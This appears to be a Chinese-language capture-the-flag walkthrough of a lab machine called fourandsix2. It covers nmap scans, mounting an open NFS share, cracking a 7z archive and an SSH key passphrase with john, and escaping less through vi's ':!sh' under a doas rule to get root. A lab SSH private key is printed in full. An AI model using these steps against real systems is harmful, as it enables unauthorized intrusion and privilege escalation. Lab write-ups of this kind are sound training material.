
## 端口扫描

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sTU --min-rate 5000 -p-   10.129.2.47 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 22:51 EST
Warning: 10.129.2.47 giving up on port because retransmission cap hit (10).
Warning: 10.129.2.47 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.2.47
Host is up (0.29s latency).
Not shown: 65371 open|filtered udp ports (no-response), 38399 closed tcp ports (conn-refused), 163 closed udp ports (port-unreach), 27130 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
137/udp open  netbios-ns

Nmap done: 1 IP address (1 host up) scanned in 306.88 seconds
                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sTU --min-rate 5000 -p- 10.10.10.23  
[sudo] kali 的密码：
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 23:55 EST
Warning: 10.10.10.23 giving up on port because retransmission cap hit (10).

                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT --min-rate 5000 -p- 10.10.10.23 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 23:58 EST
Warning: 10.10.10.23 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.23
Host is up (0.00076s latency).
Not shown: 57689 filtered tcp ports (no-response), 7842 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
643/tcp  open  sanity
2049/tcp open  nfs
MAC Address: 00:0C:29:C4:40:E8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 151.83 seconds
                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sCV -O -p22,111,643,2049 10.10.10.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 00:01 EST
Nmap scan report for 10.10.10.23
Host is up (0.00047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          643/tcp   mountd
|_  100005  1,3          908/udp   mountd
643/tcp  open  mountd  1-3 (RPC #100005)
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 00:0C:29:C4:40:E8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 6.X
OS CPE: cpe:/o:openbsd:openbsd:6
OS details: OpenBSD 6.0 - 6.4
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.62 seconds
```

## nfs共享目录
可以发现这个靶机没有开80端口
攻击面只能放在nfs
先挂载一下目录
```bash
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.10.23                                 
Export list for 10.10.10.23:
/home/user/storage (everyone)

┌──(kali㉿kali)-[~/workspace]
└─$ sudo mount -t nfs 10.10.10.23:/home/user/storage /tmp -o nolock
                                                                                                                                                              
┌──(kali㉿kali)-[~/workspace]
└─$ ls /tmp     
backup.7z
               
```
先是使用了7z2john 将其换成hash值
然而john破解失败了
## 7z破解
到下面这个网站去破解倒是出密码了
![](images/2024-03-08-13-32-28.png)
chocolate
那么就看下7z里的信息吧

看到私钥和公钥
```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat id_rsa           
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCmv/BkXU
N5gfqui9Z/92KAAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//
nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwS
inmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8
r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGr
rWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/i
RwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANnAAADwAO39g1ZtgarNJ
4hcnHTgx/DLgDeet1AhvBBsVjk94i8WLhy0luUvigJcMwHY6MgxL/ZNJfe3cZZ2/Rpo5g5
j5fzQ8vBHlglN9Z1GPVmeKdUHpRzrLFuARQOitYiWn9suwVafhgTS1hAof3Fqsik3pogEn
qp9pm39lalPVNgNVj6HCr2iJ0iq/MXjAmbgYxvpYXhzjyGzfPRlsw3y1T0pIxq3y9AzVBz
BCWF9x/GS1mXiDvGbNyb21ymn+NJq1eZKBN2LGJOHV2v+GGBkRTIYDsUpRbN56OJgu7Fyk
sECQIARA3ngs7tJhkGwtU7tIihiw/JlRtNu3GZwEsd5RVyX6cK8xGuaqlUulmm5E1CnxXz
3zj8MNhZtpDJaTpda83BhkxkSYb2svJ5rqO8HTYX2XtvPBEAN3U/dbcYVwNIdJ77TmckvS
tqvWi+DlZ6SL5Jlsj3WIFwXrmSIUQATA0jcF4d/FOoYOFTAQJ1y2pm97Q8UCErizu+SjfR
yQ7Q7QERsuAWBKthTGWkmzWKTYG8cpKso4lwbbjKJapfovEDtJgtFZpaX2+2YMMBx5AtaU
wNJShNYfIan4d8E2l6R77bBjqff4Qk1EMZzyXhG/Qe63buiCpUk6EevAf5Z2LXHJa4JYW3
PVcSXL3pbAOKEt6c36Q7CMHLmgOR9Be9wU/G+0FkDhdcgdkfOHaROfbK+RLhZ9tMO2peFP
POba2/Mw/kIK2Tepw7dQMvZ8KU+rBISeTE0YoSNYpt5A7ClskeLsXh9KCA/6Glnw+xKS+K
ewK2ooDck0EwHUmVQqC4qkXzbPbcj37WwMO3mzcQo7MARluOX8Y5b6JReqdhzvM5S7/uOb
cIblXwq9h71gTPirzhnn9QaJ/DnbGX4Ww7m8nkFkf9qwghWM+vKMjTxGSFHFXubk8l+5CG
fAOYC1igZMjKO5+2u60LMhtPjkGdUMbq0hv2FCxZW1ajlGwZIYWs2MLW7LGVSwC7re+fM2
1RaMxWvn73VjjooB+7hexe7l35mr5TyaZcQKCtJSNQRrGsSxHLUTEtvLY9FHOCnLgcsUzi
Tm826t9dvsrYHJh8W/wSqSYQ9t1niLg2MulioK6H8FTDAupkhZUkkbL0FEbe+Dl3cIeUW6
nXgaf6F+9tQHNQCI9QT1a/kGSGgQRRjuSdmVZieqdafJ7jHavLjzjcsiKQtjzkyaCp1hpa
dS6IZqF9DzlbtJRNlrO6Tq3j7gtL4DCURx2Jq13JO1hWDffIyrRZfgGeovGK/UAbTeTQ9M
rPy1AS6A==
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                                           
┌──(kali㉿kali)-[/tmp]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2
```
想用私钥登一下发现失败了
还是要密码
这里公钥已经给出一个用户名了
也就是说只要有user用户的密码即可登录
那么先用john继续破解一下
ssh2john将hash值输入到hashssh.txt
```bash
┌──(kali㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hashssh.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
12345678         (id_rsa)     
1g 0:00:00:01 DONE (2024-03-08 02:11) 0.9523g/s 30.47p/s 30.47c/s 30.47C/s 123456..butterfly
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
找到密码后继续连接

## 提权

然后登录成功后发现没有sudo权限，没有计划任务，没有可写脚本
```bash
fourandsix2$ find / -perm  -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chpass
/usr/bin/chsh
/usr/bin/doas
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/passwd
/usr/bin/su
/usr/libexec/lockspool
/usr/libexec/ssh-keysign
/usr/sbin/authpf
/usr/sbin/authpf-noip
/usr/sbin/pppd
/usr/sbin/traceroute
/usr/sbin/traceroute6
/sbin/ping
/sbin/ping6
/sbin/shutdown
```

这里有个doas
这个命令之前是没有接触过的
doas
根据他的命令名
do as
就是和sudo 相似的效果
那么去看一下doas的配置是什么
```bash
fourandsix2$ find / -type f -name "doas.conf" 2>/dev/null
/etc/examples/doas.conf
/etc/doas.conf
fourandsix2$ cat /etc/doas.conf
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root
```

这条配置意味者，user用户可以使用root用户权限执行less命令去查看authlog文件
那么就直接执行


```bash
fourandsix2$ doas -u root /usr/bin/less /var/log/authlog

fourandsix2# whoami
root
fourandsix2# 
```
进入less页面时，按v，进入vi编辑模式，:!sh即可提权